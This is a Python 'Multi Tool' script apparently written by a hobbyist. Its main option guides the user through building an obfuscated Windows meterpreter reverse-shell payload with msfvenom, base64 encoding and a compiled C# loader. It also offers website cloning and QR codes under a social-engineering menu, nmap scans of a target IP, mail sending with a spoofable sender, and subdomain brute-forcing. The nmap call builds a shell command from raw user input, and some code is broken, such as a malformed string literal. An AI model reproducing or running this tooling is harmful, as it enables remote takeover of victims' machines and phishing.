#!/usr/bin/python3
from paramiko import SSHClient, AutoAddPolicy

import os.path

import colorama

from colorama import Fore

from subprocess import call

import smtplib

import requests

import qrcode

import cv2



os.system('clear')


print(Fore.BLUE + '>-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<')
print('>                                                                                                                                                                                         <')
print(Fore.RED + '>                                                                          »  made by  Gr0tten0lm  «                                                                                      <')
print(Fore.BLUE + '>                                                                                                                                                                                         <')
print('>                                                                                                                                                                                         <')
print(Fore.BLUE + '>-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<')

print(Fore.RED + "Version 1.11")

print(Fore.RED + "Welcome to my Multi Tool!")







print(Fore.LIGHTYELLOW_EX + '|-----------------------------------------------------------------------------------------|')
print(Fore.LIGHTYELLOW_EX + '|                                                                                         |')
print(Fore.LIGHTCYAN_EX + '|<1> Windows Reverse Shell                                 <2> Socialengineering          |')
print(Fore.LIGHTYELLOW_EX + '|                                                                                         |')
print(Fore.LIGHTCYAN_EX + '|<3> Nmap                                                  <4> SMTP Service               |')
print(Fore.LIGHTYELLOW_EX + '|                                                                                         |')
print(Fore.LIGHTCYAN_EX + '|<5> Subdomain scanner                                                                    |')
print(Fore.LIGHTYELLOW_EX + '|-----------------------------------------------------------------------------------------|')







option = input("Type here your option > ")




if '1' in option:

        os.system('clear')


        inp = input(Fore.RED + 'Do you already have a file to encrypt yes/no : ')


        #Reverse shell
        if 'no' in inp:

                print(Fore.GREEN + "Create now your own File .....")

                print(Fore.BLUE + "msfvenom -p windows/x64/meterpreter_reverse_https LHOST=(enter your IP) LPORT=443 --encrypt xor --encrypt-key test --format raw > wp1")

                done1 = input("Press ENTER when done ")

                print(Fore.GREEN + "Creating windows payload File ......")

                print("Done")

                print(Fore.BLUE + "Installing the compiler ....")

                os.system('sudo apt-get install mono-mcs')

                print(Fore.GREEN + "Starting encryption ......")

                os.system('base64 wp1 > ewp1')

                os.system('pluma ewp1')

                print("Now copy the code and paste it down in the line 135 ")

                os.system('pluma windows.cs')

                done2 = input("Press ENTER to finish ")

                os.system('mcs windows.cs')

                print(Fore.BLUE + "The File is now ready!")




        if 'yes' in inp:

                print(Fore.BLUE + "Installing the compiler ....")

                os.system('sudo apt-get install mono-mcs')

                print(Fore.GREEN + "Starting encryption ......")

                os.system('base64 wp1 > ewp1')

                os.system('pluma ewp1')

                print("Now copy the code and paste it down in the line 135 ")

                os.system('pluma windows.cs')

                done2 = input("Press ENTER to finish ")

                os.system('mcs Program.cs')

                print(Fore.BLUE + "The File is now ready!")



if '2' in option:

        os.system('clear')


        print(Fore.LIGHTYELLOW_EX + '|-----------------------------------------------------------------------------------------|')
        print(Fore.LIGHTYELLOW_EX + '|                                                                                         |')      
        print(Fore.LIGHTCYAN_EX + '|<1> Website Copy                                 <2> Create QRCode                       |')
        print(Fore.LIGHTYELLOW_EX + '|                                                                                         |')
        print(Fore.LIGHTCYAN_EX +   '|                                                                                         |')
        print(Fore.LIGHTYELLOW_EX + '|                                                                                         |')
        print(Fore.LIGHTYELLOW_EX + '|                                                                                         |')
        print(Fore.LIGHTYELLOW_EX + '|-----------------------------------------------------------------------------------------|')



        inp2 = input("Type here your option > ")

        if '1' in inp2:

                site = input(Fore.LIGHTYELLOW_EX + 'Type here the website (e.g. https://example.com) > ')

                response = requests.get(site)
                response.content
                print(Fore.LIGHTCYAN_EX + response.content)
        

        if '2' in inp2:

                qrdata = input('Type here the QRCode data > ')

                img = qrcode.make(qrdata)

                nafile = input('Type here the name of the File (e.g. example.png) > ')

                img.save(nafile)


if '3' in option:

        ip = input(Fore.LIGHTYELLOW_EX + 'Enter the target ip here > ')

        print(Fore.LIGHTCYAN_EX + '.')

        os.system('clear')

        os.system('nmap -sV ' + ip)

        print(Fore.GREEN + 'Done')



if '4' in option:

        connect = input(Fore.LIGHTYELLOW_EX + 'Mail Server:Port > ')

        user = input('Username > ')

        pwd = input('Password > ')

        server = smtplib.SMTP(connect)
        server.starttls()
        server.login(user, pwd)

        mailtext = input('Mail Text, end with ^D > ')

        subj = input('Subject > ')

        MAIL_FROM = input('From where the mail is sent > ')

        RCPT_TO = input('The mail address of the recipient > ')


        DATA = '("From: %s\r\nTo: %s\r\n\r\n"
                % (MAIL_FROM, ", ".join(RCPT_TO)))


        server = smtplib.SMTP(connect)
        server.starttls()
        server.login(user, pwd)
        server.sendmail(MAIL_FROM, RCPT_TO, DATA)
        server.quit()








if '5' in option:

        domain = input(Fore.LIGHTYELLOW_EX + 'Enter here your domain (e.g. example.com > ')

        flist = input('Which list do you want ? large/small > ')

        if 'large' in flist:

                subfile =  open('largelist.txt')

                cont = subfile.read()
                
                subdomains = cont.splitlines()

                subs_disc = []

                for subdomain in subdomains:

                        url = f"https://{subdomain}.{domain}"

                        try:
                                requests.get(url)
                        except requests.ConnectionError:
                                
                                pass
                        
                        else:
                                print(Fore.LIGHTCYAN_EX + "|+| subdomain found! > ", url)

                                subs_disc.append(url)


        if 'small' in flist:

                subfile =  open('smalllist.txt')

                cont = subfile.read()
                
                subdomains = cont.splitlines()

                subs_disc = []

                for subdomain in subdomains:

                        url = f"http://{subdomain}.{domain}"

                        try:
                                requests.get(url)
                        except requests.ConnectionError:
                                
                                pass
                        
                        else:
                                print(Fore.LIGHTCYAN_EX + "|+| subdomain found! > ", url)

                                subs_disc.append(url)


